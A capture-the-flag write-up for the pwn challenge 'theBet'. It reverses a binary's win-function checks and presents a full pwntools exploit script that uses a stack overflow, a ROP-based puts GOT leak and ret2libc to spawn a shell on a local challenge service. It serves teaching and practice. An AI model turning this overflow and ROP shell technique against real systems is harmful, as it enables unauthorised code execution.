# theBet

Challenge Points: 200

No of Solves:

Challenge Author: [d1g174l_f0r7r355](https://twitter.com/BhaskaraShravya)

This challenge was ret2win + dynamic rop. Some may have used tools like angr and z3 for a few of the win() functions in order to guess the arguments, however in my writeup, I have used neither. 

## Preliminary Analysis:
```
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial

```

## Analyzing the binary:
Here's the decompilation for main().
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  time_t v3; // rax

  initialize(argc, argv, envp);
  v3 = time(0LL);
  LOBYTE(v3) = 0;
  srand(v3);
  vuln();
  return 0;
}

```
From main, srand() initialized and vuln called. 

### vuln:

```
  int v0; // eax
  int v1; // eax
  int v2; // eax
  char s[40]; // [rsp+0h] [rbp-50h] BYREF
  __int64 argument4; // [rsp+28h] [rbp-28h]
  __int64 argument3; // [rsp+30h] [rbp-20h]
  __int64 argument2; // [rsp+38h] [rbp-18h]
  __int64 argument1; // [rsp+40h] [rbp-10h]
  bool v9; // [rsp+4Dh] [rbp-3h]
  bool v10; // [rsp+4Eh] [rbp-2h]
  bool v11; // [rsp+4Fh] [rbp-1h]

  v11 = 0;
  v10 = 0;
  v9 = 0;
  argument1 = 3735928559LL;
  argument2 = 3203386110LL;
  argument3 = 3735931646LL;
  argument4 = 3133071021LL;
  puts("Please enter your name: ");
  fgets(s, 128, stdin);
  v0 = win1(argument1);
  v11 = v0 != 0;
  if ( !v0 || (v1 = win2(argument2, argument3), v10 = v1 != 0, !v1) )
    exit(0);
  v2 = win3(argument4);
  v9 = v2 != 0;
  if ( !v2 )
    exit(0);
  return v9;

```

In the decompilation of vuln(), we see four arguments isnitialized to `0xdeadbeef`, `0xbeefcafe`, `0xdeadcafe`, and `0xbabedead` respectively. 
At first, `win1()` is called with `argument1` as a parameter. 

### win1():

Decompilation for win1():
```c=
  double y1; // xmm1_8
  double num_doub; // xmm0_8
  double num_doub_y; // xmm0_8
  double x1; // [rsp+0h] [rbp-60h]
  unsigned __int64 arg1_dup; // [rsp+8h] [rbp-58h]
  char st[40]; // [rsp+10h] [rbp-50h]
  int rem; // [rsp+38h] [rbp-28h]
  int m; // [rsp+3Ch] [rbp-24h]
  int k; // [rsp+40h] [rbp-20h]
  int j; // [rsp+44h] [rbp-1Ch]
  int p; // [rsp+48h] [rbp-18h]
  int len; // [rsp+4Ch] [rbp-14h]
  unsigned __int64 num; // [rsp+50h] [rbp-10h]
  unsigned __int64 i; // [rsp+58h] [rbp-8h]

  arg1_dup = arg1;
  len = 0;
  p = 0;
  for ( i = arg1; i; i /= 0xAuLL )              // finding length of the argument passed. 
    ++len;                                      // i.e if argument is "12345678", then length returned is 8. 
                                                // 
                                                // 
  for ( j = 0; j < len; ++j )                   // storing the argument as a string in reverse order. 
                                                // 
  {
    rem = arg1_dup % 0xA;                       // i.e if argument is "12345678", (passed as an unsigned int), 
                                                // 
    arg1_dup /= 0xAuLL;
    st[len - (j + 1) + 16] = rem + 48;          // then string stored is "87654321" as a string. 
  }
  st[len + 16] = 0;                             // updating st[len+16] to 0.
                                                // 
  for ( k = 0; k < len; ++k )
  {
    if ( k >= len / 2 )                         // reversing the second half of the string and storing it back into st.
    {
      if ( k < len && p < len / 2 )             // for eg, if the string obtained after the above manipulations was, "1234567890"
                                                // then taking second half of the string i.e "67890",
                                                // reversing it to get "09876", and storing it back into st as the second half of the string itself.
        st[k] = st[len - 1 - p++ + 16];
    }
    else
    {
      st[k] = st[len / 2 - 1 - k + 16];         // reversing the first half of the string and storing it back into st.
    }                                           // for eg, if the string obtained after the above manipulations was, "1234567890"
                                                // then taking first half of the string i.e "12345",
                                                // reversing it to get "54321", and storing it back into st as the first half of the string itself.
  }
  st[len] = 0;                                  // updating st[len] = 0.
  num = 0LL;
  p = 0;
  for ( m = len - 1; m >= 0; --m )              // this part of the code may seem tricky after decompilation, 
                                                // but eventually, it only converts the string obtained after the above manipulations into an integer.
                                                // However, since num is declared as an unsigned integer, checks are done regarding the same. 
                                                // 
  {
    x1 = (double)(st[m] - 48);
    y1 = x1 * pow(10.0, (double)p);
    if ( (num & 0x8000000000000000LL) != 0LL )  // minimum value for "long long int" is 0x8000000000000000. 
                                                // Thus checking if num obtained is a "long long int" number.
                                                // 
      num_doub = (double)(int)(num & 1 | (num >> 1)) + (double)(int)(num & 1 | (num >> 1));
    else                                        // doing the required conversion to "double int"
      num_doub = (double)(int)num;
    num_doub_y = num_doub + y1;
    if ( num_doub_y >= 9.223372036854776e18 )   // int64 max value is 9223372036854775807 or 9.223372036854775807E+18
    {
      num = (unsigned int)(int)(num_doub_y - 9.223372036854776e18);// if greater, subtracting max int64 value. 
      num ^= 0x8000000000000000LL;              // xoring with minimum value for "long long int" i.e 0x8000000000000000
    }
    else
    {
      num = (unsigned int)(int)num_doub_y;      // if num is lesser than max int64 value, then storing unigned long int value of "num_doub_y" into "num". 
    }
    ++p;
  }
  return num == 3405691582;                     // returns 1; if num==0xcafebabe
}
```

Thus from the above decompilation, we conclude, `num==0xcafebabe`. 
Since the argument passed, is first halved and then reversed, the argument to win1() will be `6504328519`. 


### win2():
Decompilation for win2():

```
return ((arg2 + arg3) ^ 0x44444444) == 0x1FFDD898FLL && ((arg2 - arg3) ^ 0x4444CCCC) == 2118188227;
```

For convinience, let us assume:
 - `x = arg2 + arg3`
 - `y = arg2 - arg3`

Solving the first part of the check we get, `x = 0x44444444 ^ 0x1FFDD898F`. i.e `x = 0x1bb99cdcb`.
Solving second part of the check we get, `y = 0x4444CCCC ^ 2118188227`. i.e `y = 0x3a04300f`.

Thus `arg2 = (x + y)//2` and `arg3 = (x - y)//2`. 
Therefore, our arguments are `arg2 = 0xfacefeed` and `arg3 = 0xc0cacede`. 

## win3():

Below is the decompilation of win3() in ghidra. 
```
  int rand_dub; // eax
  double v3; // [rsp+0h] [rbp-30h]
  __int64 rand_dub_dub; // [rsp+10h] [rbp-20h]
  int j; // [rsp+1Ch] [rbp-14h]
  int len; // [rsp+20h] [rbp-10h]
  int sum; // [rsp+24h] [rbp-Ch]
  unsigned __int64 i; // [rsp+28h] [rbp-8h]

  sum = 0;
  len = 0;
  rand_dub = rand();
  rand_dub_dub = rand_dub;
  for ( i = rand_dub; i; i /= 0xAuLL )          // finding length of the random value returned in rand().
    ++len;
  for ( j = len - 1; j >= 0; --j )
  {
    if ( rand_dub_dub < 0 )                     // if ran_dub_dub is negative, then conversion to double takes place. 
                                                // But one thing to note is, when rand() is used, usually an unsigned integer is returned. 
      v3 = (double)(int)(rand_dub_dub & 1 | ((unsigned __int64)rand_dub_dub >> 1))
         + (double)(int)(rand_dub_dub & 1 | ((unsigned __int64)rand_dub_dub >> 1));
    else
      v3 = (double)(int)rand_dub_dub;
    sum += (int)(v3 / pow(10.0, (double)j)) % 10;// summing up the digits in the random number. 
  }
  return arg4 == sum;                           // returning 1 if arg4 == sum. 
```

To find the rand() value, we can make use of ctypes in python. Thus the argument to win3() can be given by the script:
```python=
libc = CDLL("libc.so.6")
libc.srand(int(time.time()) & 0xffffff00)
rand_val = libc.rand()

st_rand = str(rand_val)
Sum = 0
for i in range(0, len(st_rand)):
	Sum += int(st_rand[i])
```

## Exploit:
Once we figure out the arguments to each of win functions, our task is get a libc leak, build a ropchain and ret2system. 
While passing arguments, one needs to note that they must be given in the reverse order. 

```python=
from pwn import *
from ctypes import CDLL

#p = process('./chall', env={"LD_PRELOAD" : "./libc.so.6"})
p = remote('localhost', 7007)
libc = CDLL("libc.so.6")
libc.srand(int(time.time()) & 0xffffff00)
rand_val = libc.rand()

st_rand = str(rand_val)
Sum = 0
for i in range(0, len(st_rand)):
	Sum += int(st_rand[i])

#gdb.attach(p)

p.recvuntil('Please enter your name: \n')

# gadgets:
pop_rdi = p64(0x0000000000401813)
main_ret = 0x00000000004017a9

arg2 = 0xfacefeed
arg3 = 0xc0cacede

pay = 'a'*0x28 + p64(Sum) + p64(arg3) + p64(arg2) + p64(0x183b02d47) + 'a'*0x8 + p64(0x00000000004017a9)
pay += pop_rdi
pay += p64(0x404018)# puts_got
pay += p64(0x00000000004010c0)# puts_plt
pay += p64(0x0000000000401774)# main_addr

p.sendline(pay)

out = p.recv(8)
out = u64(out[:-2].ljust(8, '\x00'))
info("leak: %s"%hex(out))

p.recvuntil('enter your name: \n')

libc_base = out - 0x875a0
system = libc_base + 0x55410
binsh = libc_base + 0x1b75aa

info("libc_base: %s"%hex(libc_base))
info("system: %s"%hex(system))
info("binsh: %s"%hex(binsh))

pay2 = 'a'*0x28 + p64(Sum) + p64(arg3) + p64(arg2) + p64(0x183b02d47) + 'b'*0x10 + p64(0x00000000004017a9)
pay2 += pop_rdi
pay2 += p64(binsh)
pay2 += p64(system)

p.clean()
p.sendline(pay2)

p.interactive()
```

